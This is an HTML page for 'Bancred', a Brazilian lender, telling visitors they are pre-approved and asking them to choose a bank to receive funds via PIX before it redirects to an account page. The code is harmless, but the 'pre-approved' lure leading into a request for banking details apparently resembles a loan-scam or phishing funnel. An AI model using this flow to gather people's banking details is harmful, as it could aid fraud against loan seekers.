<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Selecione seu Banco - Bancred</title>
  <meta name="theme-color" content="#FFFFFF">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; border: 0 solid; }
    html { -webkit-text-size-adjust: 100%; }
    body { min-height: 100dvh; font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #111827; -webkit-font-smoothing: antialiased; display: flex; flex-direction: column; background: #FFFFFF; }
    h1, h2, h3, h4, p { margin: 0; }
    button { font-family: inherit; }
    .bank-btn { width:100%;padding:14px 16px;background:#FFFFFF;border:1.5px solid #E5E7EB;border-radius:12px;cursor:pointer;display:flex;align-items:center;gap:14px;text-align:left;transition:all 0.15s; }
    .bank-btn:hover { background:#EFF6FF;border-color:#1C68E3; }
    .bank-icon { width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:11px;font-weight:800;color:#FFFFFF; }
    button:hover:not(.bank-btn) { filter: brightness(0.93); }
  </style>
</head>
<body>

  <header style="background:#FFFFFF;border-bottom:1px solid #E5E7EB;padding:16px;">
    <div style="max-width:1280px;margin:0 auto;display:flex;justify-content:center;">
      <a href="index.html" style="height:56px;display:inline-flex;align-items:center;justify-content:center;gap:10px;text-decoration:none;">
        <svg width="32" height="32" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="38" height="38" rx="10" fill="#EFF6FF"/>
          <path d="M7 28V16l12-7 12 7v12" stroke="#1C68E3" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
          <rect x="14" y="20" width="10" height="8" rx="1" stroke="#1C68E3" stroke-width="2"/>
          <path d="M10 28h18" stroke="#1C68E3" stroke-width="2" stroke-linecap="round"/>
        </svg>
        <span style="font-size:22px;font-weight:800;color:#1C68E3;letter-spacing:-1px;">Bancred</span>
      </a>
    </div>
  </header>

  <main style="flex:1;background:#F9FAFB;">
    <section style="padding:32px 16px;">
      <div style="max-width:448px;margin:0 auto;">

        <div style="text-align:center;margin-bottom:24px;">
          <div style="display:inline-flex;align-items:center;gap:6px;background:#DCFCE7;color:#15803D;padding:6px 14px;border-radius:999px;font-size:13px;font-weight:700;margin-bottom:12px;">
            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>
            Pré-aprovado!
          </div>
          <div style="font-size:22px;font-weight:800;color:#0F172A;letter-spacing:-0.4px;margin-bottom:6px;">Onde deseja receber?</div>
          <p style="color:#64748B;font-size:14px;">Selecione o banco para recebimento via PIX</p>
        </div>

        <div style="background:#FFFFFF;border:1px solid #E5E7EB;border-radius:16px;box-shadow:0 4px 6px -1px rgba(0,0,0,0.07),0 2px 4px -2px rgba(0,0,0,0.05);padding:20px;">
          <div style="display:flex;flex-direction:column;gap:10px;">

            <button class="bank-btn" onclick="selectBanco('Nubank')">
              <div class="bank-icon" style="background:#820AD1;">NU</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Nubank</div>
                <div style="font-size:12px;color:#6B7280;">Banco digital</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="bank-btn" onclick="selectBanco('Caixa Econômica Federal')">
              <div class="bank-icon" style="background:#005CA5;">CEF</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Caixa Econômica Federal</div>
                <div style="font-size:12px;color:#6B7280;">Banco público</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="bank-btn" onclick="selectBanco('Bradesco')">
              <div class="bank-icon" style="background:#CC2B2B;">BB</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Bradesco</div>
                <div style="font-size:12px;color:#6B7280;">Banco privado</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="bank-btn" onclick="selectBanco('Banco do Brasil')">
              <div class="bank-icon" style="background:#F9D000;color:#1A1A1A;">BB</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Banco do Brasil</div>
                <div style="font-size:12px;color:#6B7280;">Banco público</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="bank-btn" onclick="selectBanco('Itaú')">
              <div class="bank-icon" style="background:#EC7000;">IT</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Itaú</div>
                <div style="font-size:12px;color:#6B7280;">Banco privado</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="bank-btn" onclick="selectBanco('Santander')">
              <div class="bank-icon" style="background:#EC0000;">SAN</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Santander</div>
                <div style="font-size:12px;color:#6B7280;">Banco privado</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="bank-btn" onclick="selectBanco('Inter')">
              <div class="bank-icon" style="background:#FF7A00;">INT</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Banco Inter</div>
                <div style="font-size:12px;color:#6B7280;">Banco digital</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

            <button class="bank-btn" onclick="selectBanco('Outro')">
              <div class="bank-icon" style="background:#6B7280;">+</div>
              <div>
                <div style="font-size:15px;font-weight:700;color:#111827;">Outro banco</div>
                <div style="font-size:12px;color:#6B7280;">Qualquer banco com PIX</div>
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-left:auto;"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
            </button>

          </div>
        </div>

      </div>
    </section>
  </main>

  <footer style="background:#111827;color:#D1D5DB;text-align:center;padding:24px 16px;font-size:12px;line-height:1.7;">
    <div style="color:#9CA3AF;">© 2026 Bancred LTDA. Todos os direitos reservados.</div>
    <div style="color:#6B7280;margin-top:4px;">CNPJ 41.906.644/0001-20</div>
  </footer>

<script>
  function selectBanco(nome) {
    sessionStorage.setItem('banco', nome);
    window.location.href = 'conta.html';
  }
</script>
</body>
</html>
